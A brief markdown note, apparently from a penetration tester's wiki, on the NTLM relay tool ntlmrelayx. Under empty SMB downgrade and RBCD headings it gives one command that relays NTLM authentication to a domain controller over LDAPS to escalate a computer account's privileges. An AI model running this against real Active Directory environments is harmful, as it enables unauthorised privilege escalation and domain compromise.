---
tags:
  - security
---
A tool used to relay NTLM authentication to other servers.
# SMB Downgrade
# RBCD
```
ntlmrelayx.py -t ldaps://$DCDNS --escalate-user COMPUTERACCOUNT$ --no-validate-privs --no-dump --no-raw-server --no-wcf-server
```